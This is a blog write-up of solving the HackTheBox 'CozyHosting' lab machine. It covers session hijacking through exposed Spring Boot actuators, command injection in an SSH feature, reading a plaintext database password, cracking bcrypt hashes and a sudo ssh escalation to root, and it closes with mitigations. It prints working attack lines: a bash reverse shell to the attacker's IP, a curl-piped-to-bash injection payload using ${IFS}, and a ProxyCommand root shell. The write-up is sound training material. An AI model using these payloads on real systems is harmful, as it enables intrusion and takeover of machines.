---
title: "HackTheBox - Cozyhosting"
author: Nasrallah
description: ""
date: 2024-03-03 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, command injection, postgres, hashcat, crack]
img_path: /assets/img/hackthebox/machines/cozyhosting
image:
    path: cozyhosting.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[CozyHosting](https://www.hackthebox.com/machines/cozyhosting) from [HackTheBox](https://www.hackthebox.com) is running a misconfigured Java framework leaking the cookie of a logged in user giving us access to the site. A command injection vulnerability is found in a feature and we exploit it to get foothold. A plain text password is found giving us access to the database where we find an easy to crack user hash. After that we exploit a sudo entry of that user to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.230
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals two open ports, 22 and 80.

The web server on port 80 is `nginx` and it's redirecting to `cozyhosting.htb` so let's add it to `/etc/hosts` file.

### Web

Let's navigate to the web page.

![webpage](1.png)

This looks like a cloud hosting website.

Let's run a directory scan:

```terminal
$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cozyhosting.htb/ -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET      285l      745w    12706c http://cozyhosting.htb/
401      GET        1l        1w       97c http://cozyhosting.htb/admin
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET      285l      745w    12706c http://cozyhosting.htb/index
204      GET        0l        0w        0c http://cozyhosting.htb/logout
200      GET        0l        0w        0c http://cozyhosting.htb/render/https://www.google.com
[####################] - 19s     4759/4759    0s      found:26      errors:0      
[####################] - 18s     4724/4724    258/s   http://cozyhosting.htb/           
```

We found a login page but we don't have any credentials.

One good way I learned from `ippsec` to enumerate website is to check the error message displayed when visiting a non existing page:

![errorpage](2.png)

Now we just copy the error message and search for it on `google`.

![google](3.png)

The errors comes from `Spring Boot` framework.

Searching for exploit in this framework reveals that it comes with multiple features called `Actuators` and can be found at `/actuator`

![actuator](4.png)

There is one interesting path which is `/actuator/sessions`, let's see what's there.

![sessions](5.png)

This revealed the session ID of user `kanderson`.

I checked if there is any cookie given to me from the website but didn't find any.

I went back to burp and found i was given one when tried to login. The name of the cookie is `JSESSIONID`.

Now let's request the admin page and add `kanderson`'s cookie.

![dashboard](6.png)

We got into the dashboard and at the bottom we find a functionality to add a host to automatic patching.

![hostname](7.png)

I filled the forms and submitted the request. Here is how it looks on burp.

![burp](8.png)

It's a post request to `/executessh`

## **Foothold**

The name `executessh` got me thinking there is a command injection vulnerability.

I started testing multiple payloads on the two different parameters `host` and `username`, and I got a hit with `$(id)` on the `username` parameter.

![ssh](9.png)

Next I tried pinging my machines using the payload `$(ping -c 5 10.10.10.10)` but I didn't receive any packets.

To solve that I replaced the spaces with `${IFS}`.

> `${IFS}` is a special shell variable that represents a `white space` by default.
{: .prompt-info }

![ping](10.png)

Now time for reverse shell.

I put the following command in a shell file and served the file using python http server.

```bash
echo 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1' > shell.sh
```

```bash
sudo python3 -m http.server 80
```

I setup a listener with `nc -lvnp 9001` and then used the following payload the request the shell file and pip it to bash.

```bash
$(curl${IFS}10.10.16.4/shell.sh|bash)
```

![revshell](11.png)

We got a shell!

## **Privilege Escalation**

### app -> josh

On the `/app` directory we find a `.jar` file which belongs to the web application.

I copied it to `/tmp` and extracted it using `unzip cloudhosting-0.0.1.jar`.

Next I searched recursively for the word `password` using `grep -Ri 'password' ./tmp` and got the following:

```terminal
app@cozyhosting:/tmp/sirius$ grep -Ri 'password' ./
grep: ./BOOT-INF/lib/spring-security-config-6.0.1.jar: binary file matches
grep: ./BOOT-INF/lib/spring-security-web-6.0.1.jar: binary file matches
grep: ./BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches
grep: ./BOOT-INF/lib/thymeleaf-spring6-3.1.1.RELEASE.jar: binary file matches
grep: ./BOOT-INF/lib/tomcat-embed-core-10.1.5.jar: binary file matches
grep: ./BOOT-INF/lib/postgresql-42.5.1.jar: binary file matches
grep: ./BOOT-INF/lib/spring-security-core-6.0.1.jar: binary file matches
grep: ./BOOT-INF/lib/spring-webmvc-6.0.4.jar: binary file matches
grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
./BOOT-INF/classes/templates/login.html:                                        <label for="yourPassword" class="form-label">Password</label>
./BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
./BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
./BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>

./BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR

grep: ./BOOT-INF/classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches

```

Found a password inside `BOOT-INF/classes/application.properties` file, let's print out the file and see if there is any other infomation.

```terminal
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

The password is used to connect to the `postgres` database.

Let's connect using the command `psql -U postgres -h 127.0.0.1`.

```terminal
app@cozyhosting:/tmp/sirius$ psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

We connected successfully.

To list the databases we run `\list`

```terminal
postgres=# \list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=#
```

We found 4 databases, let's use `cozyhosting` with `\c` command:

```terminal
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# 
```

We run `\d` to list tables:

```terminal
cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)
```

`users` seems interesting, let's dump it with `select * from users;`

```terminal
cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

We found two `bcrypt` hashes, let's try cracking them using `hashcat` with the mode `3200`

```terminal
λ hashcat -m 3200 admin.hash rockyou.txt
hashcat (v6.2.6) starting


Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 116 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
Time.Started.....: Thu Dec 28 17:14:28 2023 (28 secs)
Time.Estimated...: Thu Dec 28 17:14:56 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      112 H/s (12.86ms) @ Accel:1 Loops:1 Thr:16 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344384 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 1536/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1023-1024
Candidate.Engine.: Device Generator
Candidates.#1....: clover -> dangerous
```

We managed to crack `admin`'s hash and found the password. Let's use to switch to user `josh`.

### josh -> root

Let's check our privileges as `josh`

```terminal
josh@cozyhosting:/tmp/sirius$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```

We can run ssh as root.

A quick visit to [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo) tells us what command to run in order to become root

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Let's run it

```terminal
josh@cozyhosting:/tmp/sirius$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# bash
root@cozyhosting:/tmp/sirius# id
uid=0(root) gid=0(root) groups=0(root)
root@cozyhosting:/tmp/sirius# 
```

## **Prevention and Mitigation**

### Actuator

Spring boot actuators are debug endpoints for the `Spring Boot` framework so they should not be accessible without authentication.

### Command injection

Avoid calling system command to carry out actions, instead use libraries and functions that do the same task as system command.

### Password

The passwords were stored correctly in the database using strong hashing algorithm, the problem is `admin`'s password is weak and we were able to crack it easily. Instead, the password should always be long and complex containing numbers and special characters.

Also avoid reusing passwords, in our case `josh` uses the same password for the spring boot account and his linux account.

### Sudo

We found the sudo entry that allows us to run ssh as root. Always apply the principle of `Least Privilege` and `Privilege separation`. A quick solve to this is to disable sudo for `josh`.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## **References**

<https://www.veracode.com/blog/research/exploiting-spring-boot-actuators>

<https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators#more-information>

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection>

<https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql>

<https://gtfobins.github.io/gtfobins/ssh/#sudo>
